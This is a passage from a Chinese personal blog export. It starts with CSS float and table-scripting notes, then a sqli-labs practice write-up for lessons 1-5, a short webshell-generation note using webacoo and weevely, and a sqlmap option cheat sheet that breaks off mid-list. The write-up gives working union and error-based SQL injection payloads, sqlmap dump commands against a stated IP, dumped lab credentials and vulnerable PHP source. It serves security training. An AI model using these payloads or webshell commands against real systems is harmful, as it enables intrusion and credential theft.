class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>浮动元素不会盖住文字，文字会自动环绕在浮动元素的周围</p><p>块元素脱离文档后，高度和宽度随内容变化</p><p>内联元素不能设置宽高，浮动后会变成块元素</p><p><strong>高度塌陷问题，重叠，越界问题</strong></p><p>父元素高度写死，避免塌陷，高度写死无法自适应子元素大小变化</p><p>隐含属性block formatting context 简称bfc<br>默认关闭，开启后，元素有如下特性</p><ol><li>父元素的外边距不会和子元素重叠</li><li>开启bfc的元素不会被浮动元素所覆盖</li><li>开启bfc的元素可以包含浮动的子元素</li></ol><p>开启方式</p><ol><li><p>设置元素浮动</p><ul><li>使用这种方式开启，虽然可以撑开父元素，但会导致父元素宽度丢失</li><li>会导致下边元素上移，不能解决问题</li></ul></li><li><p>设置元素绝对定位</p></li><li><p>设置元素为inline-block</p><ul><li>可以解决问题，但会导致宽度丢失</li></ul></li><li><p>将元素的overflow设置为一个非visiable的值(父元素)</p><ul><li>推荐方式，将overflow设置为hidden;</li><li>ie6以下不支持</li></ul></li><li><p>hasLayout可解决</p><ul><li>元素的zoom设置为1，放大的意思，zoom:1；不放大，只支持ie8以下</li></ul></li></ol><p>总结: 同时写zoom和overflow</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### table操作</span><br><span class="line"></span><br><span class="line">标准table</span><br><span class="line">```html</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>商品名称<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>数量<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>价格<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>操作<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>1<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>2<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tfoot</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tfoot</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>切记，thead跟tbody要分开，不然的话，取数会出问题</strong><br>操作</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">parentElement <span class="comment">//这个可以获取父元素，比如td的小弟button，要找到他的tr，就是button.parentElement.parentElement</span></span><br><span class="line">line.parentNode.parentNode.cells <span class="comment">// tableRowElement.cells可以获取tr一行，然后通过数组下标进行操作，tr[0],tr[1]</span></span><br><span class="line"><span class="keyword">var</span> table=<span class="built_in">document</span>.getElementsByTagName(<span class="string">'table'</span>)[<span class="number">0</span>];<span class="comment">//获取table</span></span><br><span class="line"><span class="keyword">var</span> Tbody = table.tBodies[<span class="number">0</span>]; <span class="comment">//获取tbody</span></span><br><span class="line"><span class="keyword">var</span> i = Tbody.rows.length; <span class="comment">//获取已有行数</span></span><br><span class="line"><span class="keyword">var</span> tr = <span class="built_in">document</span>.createElement(<span class="string">"tr"</span>); <span class="comment">//创建一行</span></span><br><span class="line">Tbody.appendChild(tr); <span class="comment">//添加孩子</span></span><br><span class="line">array[<span class="number">1</span>].setAttribute(<span class="string">"contentEditable"</span>,<span class="string">"true"</span>); <span class="comment">//设置属性</span></span><br></pre></td></tr></table></figure><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/undefined/">https://noone-hub.github.io/posts/undefined/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <tags>
        <tag>html， css</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs练习</title>
    <url>/posts/ca25cf0b/</url>
    <content><![CDATA[<h1 id="sqlib"><a href="#sqlib" class="headerlink" title="sqlib"></a>sqlib</h1><h2 id="sqli-labs1"><a href="#sqli-labs1" class="headerlink" title="sqli-labs1"></a>sqli-labs1</h2><p>拿到这个网站，不知道要干嘛。。。输入?id=1后便开始注入之旅</p><h3 id="注入数据库名"><a href="#注入数据库名" class="headerlink" title="注入数据库名"></a>注入数据库名</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://43.247.91.228:84/Less-1/?id=0<span class="string">' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</span></span><br></pre></td></tr></table></figure><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><p>emails<br>referers<br>uagents<br>users</p><p>拿到数据库名，</p><h3 id="注入表名"><a href="#注入表名" class="headerlink" title="注入表名"></a>注入表名</h3><p>users: id,email_id<br>emails: id,email_id<br>uagents:id,uagent,ip_address,username<br>referers: id,referer,ip_address</p><h3 id="注入列名"><a href="#注入列名" class="headerlink" title="注入列名"></a>注入列名</h3><p>id,username,password</p><h3 id="表"><a href="#表" class="headerlink" title="表"></a>表</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://43.247.91.228:84/Less-1/?id=7<span class="string">' union select 3,username,password from users --+</span></span><br></pre></td></tr></table></figure><p>这里遍历1,2,3遍历下去就可以拿到所有用户名和密码了</p><h3 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://43.247.91.228:84/Less-1/?id=0"</span> -p id --dbs</span><br></pre></td></tr></table></figure><p>数据库名<br>[<em>] challenges<br>[</em>] information_schema<br>[<em>] mysql<br>[</em>] performance_schema<br>[*] security</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://43.247.91.228:84/Less-1/?id=0"</span> -p id -D security --tables</span><br></pre></td></tr></table></figure><p>表名<br>+———-+<br>| emails |<br>| referers |<br>| uagents |<br>| users |<br>+———-+</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://43.247.91.228:84/Less-1/?id=0"</span> -p id -D security -T users --columns</span><br></pre></td></tr></table></figure><p>列名<br>+———-+————-+<br>| Column | Type |<br>+———-+————-+<br>| id | int(3) |<br>| password | varchar(20) |<br>| username | varchar(20) |<br>+———-+————-+</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://43.247.91.228:84/Less-1/?id=0"</span> -p id -D security -T users --columns -C username,password --dump</span><br></pre></td></tr></table></figure><p>dump数据库<br>+———-+————+<br>| username | password |<br>+———-+————+<br>| Dumb | Dumb |<br>| Angelina | I-kill-you |<br>| Dummy | p@ssword |<br>| secure | crappy |<br>| stupid | stupidity |<br>| superman | genious |<br>| batman | mob!le |<br>| admin | admin |<br>| admin1 | admin1 |<br>| admin2 | admin2 |<br>| admin3 | admin3 |<br>| dhakkan | dumbo |<br>| admin4 | admin4 |<br>+———-+————+</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://43.247.91.228:84/Less-1/?id=0"</span> -p id -D security -a</span><br></pre></td></tr></table></figure><p>dump所有该库里的所有表</p><h3 id="mysql学习"><a href="#mysql学习" class="headerlink" title="mysql学习"></a>mysql学习</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">show databases; <span class="comment">#查看数据库</span></span><br><span class="line">use database <span class="comment">#选择数据库</span></span><br><span class="line">select table_name from information_schema.tables <span class="built_in">where</span> table_schema=database(); <span class="comment">#查看数据库中表</span></span><br><span class="line">select column_name from information_schema.columns <span class="built_in">where</span> table_name=<span class="string">'user'</span>; <span class="comment">#查看数据库中列名</span></span><br><span class="line">select User,Password from user; <span class="comment">#查询数据</span></span><br></pre></td></tr></table></figure><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>–+ 以及– 以及#注释方法有何不同，在这里只有–+合适，这是为什么</p><p>解决:</p><ol><li>#号用urlencode一次就可以</li><li>– 将空格用urlencode一次</li><li>–+ 直接就可以</li></ol><p>原因:</p><ol><li>http请求不包括#号</li><li>url中末尾包含空格不会发送空格，需转义</li><li>+号在保留字符内，会被编码成空格</li></ol><h3 id="源码学习"><a href="#源码学习" class="headerlink" title="源码学习"></a>源码学习</h3><p>注意到，这里是直接<br>$sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;<br>然后直接查询，导致了sql注入，还有这里是字符型</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/sql-connect.php"</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// take the variables </span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'ID:'</span>.$id.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line">	<span class="keyword">if</span>($row)</span><br><span class="line">	&#123;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">"&lt;font size='5' color= '#99FF00'&gt;"</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line">	print_r(mysql_error());</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value"</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="sqli-labs2"><a href="#sqli-labs2" class="headerlink" title="sqli-labs2"></a>sqli-labs2</h2><p>这里变成了数字型注入，也就是说不用引号闭合</p><h3 id="表查询"><a href="#表查询" class="headerlink" title="表查询"></a>表查询</h3><p>emails,emails,referers,referers,referers,uagents,uagents,uagents,uagents,users,users,users</p><h3 id="列查询"><a href="#列查询" class="headerlink" title="列查询"></a>列查询</h3><p>id,username,password</p><h3 id="同理可得"><a href="#同理可得" class="headerlink" title="同理可得"></a>同理可得</h3><p>payload</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=0 union select 1,2,group_concat(column_name,0x3a) from information_schema.columns <span class="built_in">where</span> table_name=<span class="string">'users'</span></span><br><span class="line"></span><br><span class="line">?id=0 union select 1,2,group_concat(username,0x3a,password) from users</span><br></pre></td></tr></table></figure><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p>这里少了个单引号，引起来，所以叫数字型注入，差别在于引号</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/sql-connect.php"</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'ID:'</span>.$id.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=$id LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line">	<span class="keyword">if</span>($row)</span><br><span class="line">	&#123;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">"&lt;font size='5' color= '#99FF00'&gt;"</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line">	print_r(mysql_error());</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123; 	</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value"</span>;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="sqli-labs3"><a href="#sqli-labs3" class="headerlink" title="sqli-labs3"></a>sqli-labs3</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=1<span class="string">'</span></span><br></pre></td></tr></table></figure><p>先测试下有没反应，报错，证明可能有注入？<br>然后测试原来的各种方法都没有效果，order就是没反应</p><p>去看源代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/sql-connect.php"</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'ID:'</span>.$id.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=('$id') LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line">	<span class="keyword">if</span>($row)</span><br><span class="line">	&#123;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">"&lt;font size='5' color= '#99FF00'&gt;"</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line">	print_r(mysql_error());</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value"</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发觉是用括号包括了起来，要闭合掉括号才可以，</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=2<span class="string">') 构造语句 --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=0'</span>) union select 1,2,group_concat(table_name,0x3a) from information_schema.tables <span class="built_in">where</span> table_schema=database()  --+</span><br></pre></td></tr></table></figure><p>同样的过程，不再重复做了</p><h2 id="sqli-labs4"><a href="#sqli-labs4" class="headerlink" title="sqli-labs4"></a>sqli-labs4</h2><p>payload</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=1<span class="string">") order by 3 --+</span></span><br></pre></td></tr></table></figure><p>我这题盲猜出来的。。。我弄完发觉我不懂为什么这样，还是看源码</p><h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$id = <span class="string">'"'</span> . $id . <span class="string">'"'</span>;</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=($id) LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure><p>php不太懂，所以没看怎么懂，调试了下就懂了</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &gt; $id = <span class="string">'1") order by 3 --+'</span>;</span><br><span class="line">php &gt; <span class="keyword">echo</span> $id;</span><br><span class="line"><span class="number">1</span><span class="string">") order by 3 --+</span></span><br><span class="line"><span class="string">php &gt; $id = '"</span><span class="string">' . $id . '</span><span class="string">"';</span></span><br><span class="line"><span class="string">php &gt; echo $id;</span></span><br><span class="line"><span class="string">"</span><span class="number">1</span><span class="string">") order by 3 --+"</span></span><br><span class="line">php &gt; $sql=<span class="string">"SELECT * FROM users WHERE id=($id) LIMIT 0,1"</span>;</span><br><span class="line">php &gt; <span class="keyword">echo</span> $sql;</span><br><span class="line">SELECT * FROM users WHERE id=(<span class="string">"1"</span>) order by <span class="number">3</span> --+<span class="string">") LIMIT 0,1</span></span><br><span class="line"><span class="string">php &gt;</span></span><br></pre></td></tr></table></figure><p>第一句会将字符串两边都加上双引号，<br>第二句然后在将id放进里面去，也就是说我们输入的会被加上个 (“ 这个前缀，所以闭合的话“)闭合掉，后面的就可以正常执行了</p><h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><ol><li>如何判断他是这种方式的注入？</li></ol><p>只能通过fuzz嘛</p><h2 id="sqli-lab5"><a href="#sqli-lab5" class="headerlink" title="sqli-lab5"></a>sqli-lab5</h2><p>payload</p><p>知识点1</p><p><span class="exturl" data-url="aHR0cDovL3d3dy5oZWxsb21hby50b3AvMjAxOS8wOC8xNi93ZWJfbXlzcWxfZmxvb3Iv" title="http://www.hellomao.top/2019/08/16/web_mysql_floor/">报错注入原理<i class="fa fa-external-link"></i></span></p><p>简单解释下: 就是group by进行分组查询的时候报错，因为我们是将 <strong>concat((select database()),floor(rand(0)*2))</strong> 作为分组查询依据，</p><p>结合:</p><ol><li>按照MySQL的官方说法，group by要进行两次运算，第一次是拿group by后面的字段值到虚拟表中去对比前，首先获取group by后面的值；第二次是假设group by后面的字段的值在虚拟表中不存在，那就需要把它插入到虚拟表中，这里在插入时会进行第二次运算，由于rand函数存在一定的随机性，所以第二次运算的结果可能与第一次运算的结果不一致，但是这个运算的结果可能在虚拟表中已经存在了，那么这时的插入必然导致主键的重复，进而引发错误。</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">MariaDB [information_schema]&gt; select floor(rand(0)*2) from USER_PRIVILEGES;</span><br><span class="line">+------------------+</span><br><span class="line">| floor(rand(0)*2) |</span><br><span class="line">+------------------+</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                0 |</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                0 |</span><br><span class="line">|                0 |</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                0 |</span><br><span class="line">|                0 |</span><br><span class="line">|                0 |</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure><ol start="2"><li>当 group by 对其进行分组的时候，首先遇到第一个值 0 ，发现 0 不存在，于是需要插入分组，就在这时，floor(rand(0)<em>2)再次被触发，生成第二个值 1 ，因此最终插入虚拟表的也就是第二个值 1 ；然后遇到第三个值 1 ，因为已经存在分组 1 了，就直接计数加1（这时1的计数变为2）;遇到第四个值 0 的时候，发现 0 不存在，于是又需要插入新分组，然后floor(rand(0)</em>2)又被触发，生成第五个值 1 ，因此这时还是往虚拟表里插入分组 1 ，但是，分组 1 已经存在了！所以报错！</li></ol><p>而这里，rand()*2的话存在一定随机性，可能是0，可能是1，假设随机到两个0的话就会报错了，而我们需要他报错，这里就在利用到rand(0)的伪随机</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=0<span class="string">' union select null,count(*),concat((select database()), floor(rand(0)*2)) as value from information_schema.tables group by value --+</span></span><br></pre></td></tr></table></figure><p>这里学了个新知识点limit args1 args2<br>从第args1条数据开始返回args2条数据</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=0<span class="string">' union select null,count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1), floor(rand(0)*2)) as value from information_schema.tables group by value --+</span></span><br></pre></td></tr></table></figure><p>这里轮询下就能报出所有表</p><p>爆出密码了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=0<span class="string">' union select null,count(*),concat((select password from users  limit 3,1), floor(rand(0)*2)) as value from information_schema.tables group by value --+</span></span><br></pre></td></tr></table></figure><p>接下来就是轮询遍历出所有数据了，这里建议用burp还是脚本吧，不手动</p><h3 id="思考-1"><a href="#思考-1" class="headerlink" title="思考"></a>思考</h3><ol><li>有没有办法可以一次查询所有数据，类似于group_concat这个，在这里怎么用不上？</li></ol><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/undefined/">https://noone-hub.github.io/posts/undefined/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <tags>
        <tag>sql注入， sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>webshell生成</title>
    <url>/posts/9524aa6d/</url>
    <content><![CDATA[<h1 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h1><h2 id="webacoo"><a href="#webacoo" class="headerlink" title="webacoo"></a>webacoo</h2><p>服务端</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">webacoo -g -o a.php</span><br></pre></td></tr></table></figure><p>客户端</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">webacco -t -u http://1.1.1.1./a.php</span><br></pre></td></tr></table></figure><h2 id="weevely"><a href="#weevely" class="headerlink" title="weevely"></a>weevely</h2><p>服务端</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">weevely generate <span class="built_in">test</span> ./a.php</span><br></pre></td></tr></table></figure><p>客户端</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">weevely url password</span><br></pre></td></tr></table></figure><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/undefined/">https://noone-hub.github.io/posts/undefined/</a><br><strong>版权声明</strong>：转载请注明出处！</p>]]></content>
      <tags>
        <tag>webshell</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap使用手册</title>
    <url>/posts/6d771160/</url>
    <content><![CDATA[<h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><p>sqlmap -u “url” -p 参数 -f 指纹信息</p><h2 id="sqlmap参数"><a href="#sqlmap参数" class="headerlink" title="sqlmap参数"></a>sqlmap参数</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">--dbms <span class="string">"数据库类型"</span> <span class="comment">#指定扫描数据库类型</span></span><br><span class="line">--os <span class="string">"linux"</span> <span class="comment">#指定操作系统</span></span><br><span class="line">--invalid-bignum、 --invalid-logical <span class="comment">#使用负数使参数失效，使用大数参数值失效，使用布尔判断参数取值失效</span></span><br><span class="line">--no-cast <span class="comment">#将结果转换为字符串，并用空格代替NULL,针对老版本mysql</span></span><br><span class="line">--no-escape <span class="comment">#出于混淆和避免出错的目的，本参数关闭此功能</span></span><br><span class="line">--prefix/--suffix <span class="comment">#指定PAYLOAD的前缀和后缀</span></span><br><span class="line">--tamper <span class="comment">#混淆脚本</span></span><br><span class="line">-D security --tables <span class="comment">#指定security数据库</span></span><br><span class="line">-T 指定表 <span class="comment">#指定表</span></span><br><span class="line">-C 指定列 <span class="comment">#指定列</span></span><br><span class="line">-p ”user-agent,referer“ <span class="comment">#指定扫描参数，会使--level失效</span></span><br><span class="line">-u “url<span class="string">"</span></span><br><span class="line"><span class="string">-f ”数据库管理系统指纹信息"</span></span><br><span class="line">--users <span class="string">"数据库账号"</span></span><br><span class="line">--banner <span class="string">"版本号“</span></span><br><span class="line"><span class="string">--schema "</span>数据库源数据<span class="string">"</span></span><br><span class="line"><span class="string">-a ”查询所有"</span></span><br><span class="line">-d <span class="string">"用户数据库类型://用户名:密码@ip:port/数据库"</span> </span><br><span class="line">-m 文本文件名</span><br><span class="line">--dbs 数据库</span><br><span class="line">-g <span class="string">"inurl:\".php&amp;id=1\""</span> 扫描谷歌搜索结果</span><br><span class="line">-r 指定post包</span><br><span class="line">--force-ssl  <span class="comment">#https包</span></span><br><span class="line">-c 配置文件 <span class="comment">#扫描配置文件</span></span><br><span class="line">--data <span class="string">"参数"</span> <span class="comment">#这个可以适用post和get</span></span><br><span class="line">--param-del 分隔符</span><br><span class="line">--cookies cookie</span><br><span class="line">--level 2 <span class="comment">#指定等级，2级才可以检测cookie</span></span><br><span class="line">--user-agent <span class="string">"用户头"</span> </span><br><span class="line">--random-agent /usr/share/sqlmap/txt/user-agents.txt <span class="comment">#随机头</span></span><br><span class="line">--level 3 <span class="comment">#等级3可以检查user-agent注入点</span></span><br><span class="line">--host <span class="string">"host头"</span> <span class="comment">#level 5</span></span><br><span class="line">--referer <span class="string">"refer头"</span> <span class="comment">#level &gt;=3</span></span><br><span class="line">--headers <span class="string">"头"</span> <span class="comment">#每个头一行</span></span><br><span class="line">--method=GET/POST <span class="comment">#指定传参方式</span></span><br><span class="line">--auth-type Basic --auth-cred <span class="string">"user:pass"</span> <span class="comment">#http协议身份认证</span></span><br><span class="line"></span><br><span class="line">--auth-cert/ --auth-file <span class="string">"名称"</span></span><br><span class="line">--proxy=<span class="string">"http://127.0.0.1:8087"</span> <span class="comment">#指定代理</span></span><br><span class="line">--proxy-cred=<span class="string">"name:pass"</span> <span class="comment">#指定代理用户名密码</span></span><br><span class="line">--ignore-proxy <span class="comment">#忽略系统级代理，扫描本地</span></span><br><span class="line">--delay 5 <span class="comment">#单位秒，每次http(s)请求之间延迟时间</span></span><br><span class="line">--timemout 5 <span class="comment">#单位秒，请求超时时间</span></span><br><span class="line">--retries 3 <span class="comment">#连接超时重试次数</span></span><br><span class="line">--randomize <span 